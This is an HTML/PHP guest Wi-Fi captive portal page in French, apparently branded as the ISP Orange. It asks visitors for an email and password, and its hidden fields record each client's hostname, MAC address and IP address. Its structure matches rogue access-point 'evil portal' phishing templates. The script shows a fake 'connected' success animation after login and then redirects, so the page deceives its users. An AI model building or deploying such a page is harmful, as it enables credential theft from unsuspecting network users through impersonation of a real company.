<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Portail Captif - Accès invité</title>
<script src="tailwind.js"></script>
<script>
  tailwind.config = {
    theme: {
      extend: {
        colors: {
          brand: {
            light: '#ffb26b',
            DEFAULT: '#ff7a00',
            dark: '#cc5e00'
          }
        }
      }
    }
  }
</script>
<style>
  body { overflow:hidden; }
  body::before {
    content:"";
    position:fixed; top:0; left:0; width:100%; height:100%;
    background: radial-gradient(circle at 25% 25%, rgba(255,122,0,0.12), transparent 25%),
                radial-gradient(circle at 75% 75%, rgba(255,178,107,0.08), transparent 25%);
    z-index:-3;
    animation: bgFloat 12s ease-in-out infinite alternate;
  }
  @keyframes bgFloat {
    0% { transform: translate(0,0) rotate(0deg); }
    50% { transform: translate(20px,-10px) rotate(5deg); }
    100% { transform: translate(0,10px) rotate(0deg); }
  }

  @keyframes fadeIn { from {opacity:0; transform: translateY(20px);} to {opacity:1; transform: translateY(0);} }
  .animate-fadeIn { animation: fadeIn 0.6s ease-out forwards; }

  .loader { width:18px; height:18px; border-radius:999px; border:3px solid rgba(255,255,255,0.2); border-top-color:white; animation: spin 0.8s linear infinite; }
  @keyframes spin { to { transform: rotate(360deg) } }

  .success-burst { position:absolute; inset:0; display:flex; align-items:center; justify-content:center; pointer-events:none; opacity:0; transform:scale(0.95); transition: opacity .2s ease, transform .4s cubic-bezier(.2,.9,.3,1);}
  .success-burst.show { opacity:1; transform:scale(1); }

  .card-3d { transition: transform 0.1s ease-out; will-change: transform; position:relative; z-index:10; }

  /* Orbs lumineux autour de la carte */
  .orb { position:absolute; width:15px; height:15px; border-radius:50%; background: radial-gradient(circle, #ff7a00 0%, #ffb26b 80%); pointer-events:none; z-index:5; opacity:0.8; }
</style>
</head>
<body class="flex items-center justify-center min-h-screen p-4 bg-gray-900 text-white font-sans">

  <!-- Success animation -->
  <div id="successBurst" class="success-burst">
    <div class="w-24 h-24 rounded-full bg-gradient-to-r from-brand to-brand-light flex items-center justify-center shadow-lg text-gray-900 text-4xl font-extrabold">✓</div>
  </div>

  <!-- Orbs container -->
  <div id="orbsContainer"></div>

  <div id="card" class="w-full max-w-md bg-gray-900 bg-opacity-50 backdrop-blur-md rounded-xl shadow-xl p-6 animate-fadeIn card-3d">

    <!-- Image / Logo en haut -->
<div class="flex justify-center mb-4">
    <img src="assets/orange_logo.png" alt="Logo" class="w-32 h-auto object-contain border-2 border-brand">
  </div>

    <h1 class="text-3xl font-extrabold text-brand mb-2 text-center">Accès Wi‑Fi invité</h1>
    <p class="text-gray-300 text-center mb-6">Connectez-vous avec identifiants pour accéder à Internet en toute sécurité.</p>

    <form id="loginForm" method="POST" action="/captiveportal/index.php" class="space-y-4">
      <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
      <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
      <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
      <input type="hidden" name="target" value="<?=$destination?>">

      <div class="relative">
        <input type="email" name="email" id="email" placeholder=" " required
               class="peer w-full rounded-lg bg-gray-800 bg-opacity-40 border border-gray-700 text-white px-4 py-3 focus:outline-none focus:ring-2 focus:ring-brand focus:border-brand"/>
        <label for="email" class="absolute left-4 top-3 text-gray-400 text-sm transition-all peer-placeholder-shown:top-3 peer-placeholder-shown:text-gray-400 peer-placeholder-shown:text-sm peer-focus:-top-2 peer-focus:text-brand peer-focus:text-xs">Adresse e-mail</label>
      </div>

      <div class="relative">
        <input type="password" name="password" id="password" placeholder=" " required
               class="peer w-full rounded-lg bg-gray-800 bg-opacity-40 border border-gray-700 text-white px-4 py-3 focus:outline-none focus:ring-2 focus:ring-brand focus:border-brand"/>
        <label for="password" class="absolute left-4 top-3 text-gray-400 text-sm transition-all peer-placeholder-shown:top-3 peer-placeholder-shown:text-gray-400 peer-placeholder-shown:text-sm peer-focus:-top-2 peer-focus:text-brand peer-focus:text-xs">Mot de passe</label>
        <button type="button" id="togglePw" class="absolute right-3 top-3 text-gray-400 hover:text-white">👁️</button>
      </div>

      <div class="flex items-center justify-between">
        <label class="flex items-center text-gray-300 text-sm">
          <input type="checkbox" name="remember" class="mr-2 accent-brand">
          Se souvenir de moi
        </label>
        <a href="#" class="text-brand text-sm hover:underline">Besoin d'aide ?</a>
      </div>

      <button type="submit" id="submitBtn" class="w-full py-3 bg-brand rounded-lg font-bold text-gray-900 hover:bg-brand-dark transition-all duration-200 flex justify-center items-center gap-2">
        <span id="btnLabel">Se connecter</span>
        <span id="btnLoader" style="display:none"><span class="loader"></span></span>
      </button>

      <button type="button" id="guestBtn" class="w-full py-3 mt-2 border border-gray-600 rounded-lg text-gray-300 hover:text-white hover:border-brand transition-all duration-200">
        Connexion invitée
      </button>
    </form>

    <p class="text-gray-500 text-xs mt-4 text-center">En vous connectant, vous acceptez les conditions d'utilisation du réseau local.</p>
  </div>

<script>
  const togglePw = document.getElementById('togglePw');
  const password = document.getElementById('password');
  const form = document.getElementById('loginForm');
  const guestBtn = document.getElementById('guestBtn');
  const submitBtn = document.getElementById('submitBtn');
  const btnLabel = document.getElementById('btnLabel');
  const btnLoader = document.getElementById('btnLoader');
  const successBurst = document.getElementById('successBurst');
  const card = document.getElementById('card');
  const orbsContainer = document.getElementById('orbsContainer');

  // Création des orbs
  const orbs = [];
  for(let i=0;i<8;i++){
    const orb = document.createElement('div');
    orb.className = 'orb';
    orb.style.left = `${Math.random()*100}%`;
    orb.style.top = `${Math.random()*100}%`;
    orbsContainer.appendChild(orb);
    orbs.push(orb);
  }

  togglePw.addEventListener('click', () => {
    if(password.type === 'password') { password.type = 'text'; togglePw.textContent = '🙈'; }
    else { password.type = 'password'; togglePw.textContent = '👁️'; }
  });

  form.addEventListener('submit', (e) => {
    e.preventDefault();
    btnLoader.style.display = 'inline-block';
    btnLabel.textContent = 'Connexion...';
    submitBtn.disabled = true;

    setTimeout(()=> {
      successBurst.classList.add('show');
      btnLoader.style.display = 'none';
      btnLabel.textContent = 'Connecté';
      setTimeout(()=> {
        const target = document.querySelector('input[name="target"]').value || '/';
        window.location.href = target;
      }, 900);
    }, 1200);
  });

  guestBtn.addEventListener('click', () => {
    btnLoader.style.display = 'inline-block';
    btnLabel.textContent = 'Connexion invitée...';
    submitBtn.disabled = true;

    setTimeout(()=> {
      successBurst.classList.add('show');
      btnLoader.style.display = 'none';
      btnLabel.textContent = 'Connecté (invité)';
      setTimeout(()=> { window.location.href = '/'; }, 900);
    }, 900);
  });

  // Effet 3D carte et orbs selon souris ou gyroscope
  function updateEffect(x,y){
    card.style.transform = `rotateX(${x}deg) rotateY(${y}deg)`;
    orbs.forEach((orb,i)=>{
      const offset = 10 + i*2;
      orb.style.transform = `translate(${y*offset}px, ${x*offset}px)`;
    });
  }

  window.addEventListener('mousemove', e => {
    const cx = window.innerWidth/2;
    const cy = window.innerHeight/2;
    const dx = (e.clientX - cx)/cx;
    const dy = (e.clientY - cy)/cy;
    updateEffect(dy*10, dx*10);
  });

  window.addEventListener('deviceorientation', e => {
    const x = e.beta ? (e.beta - 45)/45*10 : 0;
    const y = e.gamma ? (e.gamma)/45*10 : 0;
    updateEffect(x, y);
  });
</script>
</body>
</html>

